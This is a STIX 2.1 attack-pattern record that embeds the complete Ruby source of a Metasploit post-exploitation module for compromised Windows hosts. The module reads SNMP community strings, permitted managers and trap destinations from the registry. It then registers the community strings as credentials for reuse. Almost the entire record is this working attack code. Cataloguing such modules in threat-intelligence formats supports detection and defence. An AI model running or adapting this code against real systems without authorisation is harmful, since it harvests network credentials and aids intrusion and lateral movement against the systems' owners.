{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d329e515-2586-4599-b053-ee96327376d3",
    "created": "2024-08-14T16:33:05.024179Z",
    "modified": "2024-08-14T16:33:05.024183Z",
    "name": "Windows Gather SNMP Settings",
    "description": "This module will enumerate the SNMP service configuration. 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/enum_snmp.rb",
            "external_id": "enum_snmp.rb"
        },
        {
            "source_name": "reference",
            "url": "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-096"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::Registry\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather SNMP Settings',\n        'Description' => %q{ This module will enumerate the SNMP service configuration. },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Carlos Perez <carlos_perez[at]darkoperator.com>',\n          'Tebo <tebo[at]attackresearch.com>'\n        ],\n        'References' => [\n          ['MSB', 'MS00-096'],\n          ['URL', 'https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-096'],\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => %w[shell powershell meterpreter],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        }\n      )\n    )\n  end\n\n  def run\n    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']\n    print_status(\"Running module against #{hostname} (#{session.session_host})\")\n\n    unless snmp_installed?\n      print_error(\"\\tSNMP service is not installed on the target host\")\n      return\n    end\n\n    print_status(\"\\tSNMP is installed!\")\n\n    community_strings\n    snmp_permitted_managers\n    trap_configuration\n  end\n\n  # Check if SNMP is installed on the target host\n  #\n  # @return [Boolean] True if the SNMP service is installed\n  def snmp_installed?\n    print_status('Checking if SNMP service is installed')\n    registry_enumkeys('HKLM\\\\System\\\\CurrentControlSet\\\\Services').include?('SNMP')\n  end\n\n  # Enumerate configured Community Strings\n  def community_strings\n    print_status('Enumerating community strings')\n    key = 'HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\SNMP\\\\Parameters\\\\ValidCommunities'\n\n    unless registry_key_exist?(key)\n      print_error(\"\\tInsufficient privileges to retrieve Community Strings or none configured\")\n      return\n    end\n\n    comm_strings = registry_enumvals(key)\n\n    if comm_strings.blank?\n      print_status(\"\\tNo Community strings configured\")\n      return\n    end\n\n    tbl = Rex::Text::Table.new(\n      'Header' => 'Community Strings',\n      'Indent' => 1,\n      'Columns' =>\n      [\n        'Name',\n        'Type'\n      ]\n    )\n\n    comm_strings.each do |c|\n      # comm_type is for human display, access_type is passed to the credential\n      # code using labels consistent with the SNMP login scanner\n      type = registry_getvaldata(key, c)\n\n      case (type.to_s.starts_with?('0x') ? type.to_i(16) : type.to_i)\n      when 4\n        comm_type = 'READ ONLY'\n        access_type = 'read-only'\n      when 1\n        comm_type = 'DISABLED'\n        access_type = 'disabled'\n      when 2\n        comm_type = 'NOTIFY'\n        access_type = 'notify'\n      when 8\n        comm_type = 'READ & WRITE'\n        access_type = 'read-write'\n      when 16\n        comm_type = 'READ CREATE'\n        access_type = 'read-create'\n      else\n        print_warning(\"Unknown access type for '#{c}' : #{type}\")\n        comm_type = 'UNKNOWN'\n        access_type = ''\n      end\n\n      tbl << [c, comm_type]\n\n      register_creds(session.session_host, 161, '', c, 'snmp', access_type)\n    end\n    print_status\n\n    tbl.to_s.each_line do |l|\n      print_status(\"\\t#{l.chomp}\")\n    end\n    print_status\n\n    true\n  end\n\n  # Enumerate configured SNMP Traps\n  def trap_configuration\n    print_status('Enumerating Trap configuration')\n\n    key = 'HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\SNMP\\\\Parameters\\\\TrapConfiguration'\n\n    unless registry_key_exist?(key)\n      print_error(\"\\tInsufficient privileges to retrieve SNMP Traps or none configured\")\n      return\n    end\n\n    trap_hosts = registry_enumkeys(key)\n\n    if trap_hosts.blank?\n      print_status(\"\\tNo Traps are configured\")\n      return\n    end\n\n    trap_hosts.each do |c|\n      print_status(\"Community Name: #{c}\")\n\n      t_comm_key = key + '\\\\' + c\n      destinations = registry_enumvals(t_comm_key)\n      next if destinations.blank?\n\n      destinations.each do |t|\n        trap_dest = registry_getvaldata(t_comm_key, t)\n        print_status(\"\\tDestination: #{trap_dest}\")\n        register_creds(trap_dest, 162, '', c, 'snmptrap', 'trap')\n      end\n    end\n  end\n\n  # Enumerate Permitted Managers\n  # Check which hosts can connect using the Community Strings\n  def snmp_permitted_managers\n    print_status('Enumerating Permitted Managers for Community Strings')\n    key = 'HKLM\\\\System\\\\CurrentControlSet\\\\Services\\\\SNMP\\\\Parameters\\\\PermittedManagers'\n\n    unless registry_key_exist?(key)\n      print_error(\"\\tInsufficient privileges to retrieve Permitted Managers or none configured\")\n      return\n    end\n\n    managers = registry_enumvals(key)\n\n    if managers.blank?\n      print_status(\"\\tSNMP packets are accepted from any host\")\n      return\n    end\n\n    print_status('SNMP packets are accepted from:')\n    managers.each do |m|\n      print_status(\"\\t#{registry_getvaldata(key, m)}\")\n    end\n  end\n\n  def register_creds(client_ip, client_port, user, pass, service_name, access_type)\n    service_data = {\n      address: client_ip,\n      port: client_port,\n      service_name: service_name,\n      protocol: 'udp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      access_level: access_type,\n      origin_type: :session,\n      session_id: session_db_id,\n      post_reference_name: refname,\n      private_data: pass,\n      private_type: :password,\n      username: user,\n      workspace_id: myworkspace_id\n    }\n\n    credential_data.merge!(service_data)\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n      core: credential_core,\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      workspace_id: myworkspace_id\n    }\n\n    login_data.merge!(service_data)\n    create_credential_login(login_data)\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}